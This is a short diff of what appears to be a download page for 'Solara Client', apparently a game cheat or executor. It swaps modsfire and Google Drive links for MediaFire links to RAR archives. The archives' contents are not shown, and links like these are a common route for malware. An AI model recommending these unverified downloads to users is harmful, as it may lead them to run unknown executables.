@@ -1,5 +1,4 @@
-Fix error : https://modsfire.com/a382IMGefOJVX3Q
+file : https://www.mediafire.com/file/ms9l5gn1copt09q/Solara+Client.rar/file
+video : https://www.mediafire.com/file/hnh4pkso2022408/Videos.rar/file
 
-Bloxstrap : https://drive.google.com/file/d/10kLqaHZJs9gf1_DUupXiasbAFDQCWq7t/view
 
-Solara : https://modsfire.com/N7VUTOcvRIe6c2K
